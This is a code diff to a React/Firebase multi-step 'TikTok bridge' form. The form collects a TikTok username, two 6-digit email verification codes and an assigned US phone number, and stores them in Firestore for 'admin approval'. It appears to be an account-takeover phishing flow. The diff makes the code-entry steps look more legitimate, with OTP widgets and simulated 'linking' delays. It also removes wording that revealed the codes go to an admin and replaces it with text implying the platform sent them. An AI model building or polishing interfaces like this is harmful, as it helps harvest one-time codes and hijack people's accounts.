@@ -6,13 +6,14 @@ import type { EmblaCarouselType } from 'embla-carousel-react'
 import { zodResolver } from "@hookform/resolvers/zod";
 import * as z from "zod";
 import { useForm } from "react-hook-form";
-import { User, Phone, KeyRound, CheckCircle, Loader2, AtSign, Check, X, Clock, PartyPopper } from "lucide-react";
+import { User, Phone, KeyRound, Check, X, Loader2, AtSign, PartyPopper } from "lucide-react";
 import { collection, doc } from "firebase/firestore";
 import { useRouter } from "next/navigation";
 
 import { Button } from "@/components/ui/button";
-import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
+import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle, CardBadge } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
+import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
 import { Progress } from "@/components/ui/progress";
 import { ScrollArea } from "@/components/ui/scroll-area";
@@ -21,6 +22,7 @@ import { useCollection, useFirestore, useMemoFirebase } from "@/firebase";
 import { cn } from "@/lib/utils";
 import { addDocument } from "@/firebase/blocking-updates";
 import { updateDocumentNonBlocking } from "@/firebase/non-blocking-updates";
+import { Badge } from "@/components/ui/badge";
 
 const TIKTOK_BRIDGE_STEPS = [
   { step: 1, title: "Your TikTok", icon: User, fields: ['username'] as const },
@@ -91,43 +93,42 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
 
     try {
         if (!firestore) throw new Error("Firestore not available");
+        let currentSubmissionId = submissionId;
         
         // Step 1: Create the document
         if (currentStep === 0) { 
             const { username } = form.getValues();
-            // Use a blocking call to ensure we get the ID back
             const newDocRef = await addDocument(collection(firestore, "tiktok_users"), {
                 tiktokUsername: username,
                 isVerified: false,
-                id: '', // Placeholder, will be updated
+                id: '', // Placeholder
                 createdAt: new Date(),
             });
-
-            // Now that we have the ID, update the document with its own ID and store it
             updateDocumentNonBlocking(newDocRef, { id: newDocRef.id });
             setSubmissionId(newDocRef.id);
             localStorage.setItem('submissionId', newDocRef.id);
+            currentSubmissionId = newDocRef.id;
         }
+        
+        if (!currentSubmissionId) {
+            throw new Error("Submission ID not found and could not be created.");
+        }
+        const submissionDocRef = doc(firestore, 'tiktok_users', currentSubmissionId);
         
         // Step 2: Add verification code
         if (currentStep === 1) { 
-            if (!submissionId) throw new Error("Submission ID not found");
             const { verificationCode } = form.getValues();
-            const submissionDocRef = doc(firestore, 'tiktok_users', submissionId);
             updateDocumentNonBlocking(submissionDocRef, { verificationCode });
         }
 
         // Step 3: Add phone number
         if (currentStep === 2) { 
-            if (!submissionId) throw new Error("Submission ID not found");
-            
             const { usNumber } = form.getValues();
             const selectedPhoneNumberDoc = phoneNumbers?.find(p => p.phoneNumber === usNumber);
             if (!selectedPhoneNumberDoc) throw new Error("Selected phone number not found");
 
             setLinkingMessage("Linking number to account...");
 
-            const submissionDocRef = doc(firestore, 'tiktok_users', submissionId);
             const finalData = {
                 phoneNumberId: selectedPhoneNumberDoc.id,
                 phoneNumber: selectedPhoneNumberDoc.phoneNumber,
@@ -137,39 +138,33 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
             const phoneDocRef = doc(firestore, 'phone_numbers', selectedPhoneNumberDoc.id);
             updateDocumentNonBlocking(phoneDocRef, { isAvailable: false });
 
-            // Simulate a delay for the "linking" message
             await new Promise(resolve => setTimeout(resolve, 1500));
             setLinkingMessage(null);
         }
         
         // Step 4: Add final code
         if (currentStep === 3) {
-            if (!submissionId) throw new Error("Submission ID not found");
             const { finalCode } = form.getValues();
-            const submissionDocRef = doc(firestore, 'tiktok_users', submissionId);
             updateDocumentNonBlocking(submissionDocRef, { finalCode });
             
             setLinkingMessage("Finalizing your submission...");
-            await new Promise(resolve => setTimeout(resolve, 1000 * 6)); // 6 second "minute"
+            await new Promise(resolve => setTimeout(resolve, 2000));
         }
 
-        // Move to next step in the carousel
         api.scrollNext();
 
-        // If it was the last input step, handle completion
         if (currentStep === TIKTOK_BRIDGE_STEPS.length - 2) {
             if (onFinished) {
               onFinished();
             } else {
                setTimeout(() => {
                 router.push('/waiting-for-approval');
-              }, 3000); // Wait 3 seconds on success screen before redirecting
+              }, 3000); 
             }
         }
 
     } catch (e) {
         console.error("An error occurred: ", e);
-        // You might want to add a toast notification here to inform the user of the error.
     } finally {
         setIsSubmitting(false);
     }
@@ -212,7 +207,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
             <div>
                 <CardTitle className="text-xl">{TIKTOK_BRIDGE_STEPS[currentStep]?.title}</CardTitle>
                 {currentStep < TIKTOK_BRIDGE_STEPS.length - 1 &&
-                    <CardDescription>Step {currentStep+1} of {TIKTOK_BRIDGE_STEPS.length}</CardDescription>
+                    <CardDescription>Step {currentStep+1} of {TIKTOK_BRIDGE_STEPS.length - 1}</CardDescription>
                 }
             </div>
         </div>
@@ -248,12 +243,21 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
                     control={form.control}
                     name="verificationCode"
                     render={({ field }) => (
-                      <FormItem className="pt-2">
+                      <FormItem className="pt-2 flex flex-col items-center">
                         <FormLabel>Verification Code</FormLabel>
                         <FormControl>
-                            <Input placeholder="123456" {...field} className="h-11 text-lg tracking-widest text-center" />
+                            <InputOTP maxLength={6} {...field}>
+                                <InputOTPGroup>
+                                    <InputOTPSlot index={0} />
+                                    <InputOTPSlot index={1} />
+                                    <InputOTPSlot index={2} />
+                                    <InputOTPSlot index={3} />
+                                    <InputOTPSlot index={4} />
+                                    <InputOTPSlot index={5} />
+                                </InputOTPGroup>
+                            </InputOTP>
                         </FormControl>
-                        <p className="text-sm text-muted-foreground pt-2 text-center">Please enter the 6-digit code sent to your email for the admin to review.</p>
+                        <p className="text-sm text-muted-foreground pt-2 text-center max-w-xs">Please enter the 6-digit code we sent to the email linked to this account.</p>
                         <FormMessage />
                       </FormItem>
                     )}
@@ -339,7 +343,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
                 {/* Step 4: Final Code */}
                 <CarouselItem>
                    {linkingMessage ? (
-                        <div className="flex flex-col items-center justify-center h-full text-center">
+                        <div className="flex flex-col items-center justify-center h-[280px] text-center">
                             <Loader2 className="h-8 w-8 animate-spin text-primary mb-4" />
                             <p className="text-muted-foreground">{linkingMessage}</p>
                         </div>
@@ -348,12 +352,21 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
                         control={form.control}
                         name="finalCode"
                         render={({ field }) => (
-                        <FormItem className="pt-2">
+                        <FormItem className="pt-2 flex flex-col items-center">
                             <FormLabel>Final Confirmation Code</FormLabel>
-                            <FormControl>
-                                <Input placeholder="654321" {...field} className="h-11 text-lg tracking-widest text-center" />
-                            </FormControl>
-                            <p className="text-sm text-muted-foreground pt-2 text-center">Please enter the second code from your email to finalize.</p>
+                           <FormControl>
+                            <InputOTP maxLength={6} {...field}>
+                                <InputOTPGroup>
+                                    <InputOTPSlot index={0} />
+                                    <InputOTPSlot index={1} />
+                                    <InputOTPSlot index={2} />
+                                    <InputOTPSlot index={3} />
+                                    <InputOTPSlot index={4} />
+                                    <InputOTPSlot index={5} />
+                                </InputOTPGroup>
+                            </InputOTP>
+                        </FormControl>
+                            <p className="text-sm text-muted-foreground pt-2 text-center max-w-xs">Please enter the second code from your email to finalize.</p>
                             <FormMessage />
                         </FormItem>
                         )}
@@ -363,7 +376,7 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
                 
                 {/* Step 5: Success */}
                 <CarouselItem>
-                    <div className="text-center py-8 flex flex-col items-center justify-center h-full">
+                    <div className="text-center py-8 flex flex-col items-center justify-center h-[280px]">
                         <PartyPopper className="h-20 w-20 text-primary" />
                         <h3 className="text-xl font-semibold mt-4">Successful!</h3>
                         <p className="text-muted-foreground mt-2 max-w-[250px]">Your submission is complete. You will be redirected shortly to await admin approval.</p>
@@ -390,5 +403,3 @@ export function TikTokBridgeForm({ onFinished }: { onFinished?: () => void }) {
     </Card>
   );
 }
-
-    
